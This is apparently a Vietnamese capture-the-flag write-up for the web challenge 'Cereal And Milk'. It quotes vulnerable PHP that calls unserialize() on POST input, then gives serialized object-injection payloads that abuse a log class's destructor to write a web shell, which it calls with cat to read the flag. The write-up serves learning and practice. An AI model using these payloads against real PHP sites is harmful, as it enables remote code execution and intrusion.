Cereal And Milk
===
**Category:** Web

**Author:** @NightWolf#0268

**Point:** 491 (74 solves)

### Description
```
What do you like for breakfast? Cereal and milk is my favorite.
Sometimes, it tastes a bit odd though.
```
- Source: `src.zip`

### Overview
- Khi vào trang web ta thử qua một lần các chức năng có trong trang web thì không có điều gì đặc biệt, kể ta chúng ta nhập vào ô input của author cho và submit.
- Ở challange này author cung cấp cho chúng ta 2 file php sau khi mở ra thì mình thấy 2 đoạn code cần focus vào là
```php
<?php

class log
{
    public function __destruct()
        {
            $request_log = fopen($this->logs , "a");
            fwrite($request_log, $this->request);
            fwrite($request_log, "\r\n");
            fclose($request_log);
        }
}

?>
```
Ở đoạn code này có mục địch là khi chạy hết code thì sẽ hủy chương trình và để ghi vào file
```php
<?php

include 'log.php';

class CerealAndMilk
{
    public $logs = "request-logs.txt";
    public $request = '';
    public $cereal = 'Captain Crunch';
    public $milk = '';
    

    public function processed_data($output)
    {
        echo "Deserilized data:<br> Coming soon.";
       # echo print_r($output);
        
    }

    public function cereal_and_milk()
    {
     echo $this->cereal . " is the best cereal btw.";   
    }

}

$input = $_POST['serdata'];
$output = unserialize($input);

$app = new CerealAndMilk;
$app -> cereal_and_milk($output);

?>
```
Ở đoạn code này nằm mục đích in ra màn hình nhưng tham số của mình nhập vào. Chúng ta có tham số nhập vào là `serdata` bằng phương thức POST và class `log.php` cũng được include ở trong class này.

### Solution
- Idea đầu tiên của mình là thêm mới một file và rce nó vì class `log.php` được include ở trong class `log.php` và ở class log thì có chức năng là ghi vào một file ở thư mục hiện tại. Payload 1 của mình
```php
O:3:"log":3:{s:4:"logs";s:5:"a.php";s:7:"request";s:27:"<?php system($_GET['cmd']);";}
```
Nhưng mình không hiểu sao payload ở trên nó không hoạt động, không thể tạo mới file nhưng mình thử trên local thì mọi chuyện vẫn bình thường.
- Payload 2 của mình là thêm một thuộc tính có class log vì class log chỉ có 2 thuộc tính nhưng mình thêm vào 1 thuộc tính là 3 thì nó sẽ bị lỗi và destruct ngay lập tức.
```php
O:3:"log":3:{s:4:"logs";s:5:"a.php";s:7:"request";s:27:"<?php system($_GET['cmd']);";s:4:"Milk";s:3:"abc";}
```
Và bất ngờ là payload nó hoạt động được. có lẽ trong lúc config author đã config thì thọt một cái gì đó làm cho chương trình không thể chạy hết code và dectruct như bình thương và có thể sử dụng payload 1.

##### Payload
- Sau khi đã add được một file php mới vào thư mục hiện tại và kèm theo đó là lệnh system bây giờ chúng ta chỉ việc tìm file flag
- ```/a.php?cmd=cat ndwbr7pVKNCrhs-CerealnMilk/flag.txt```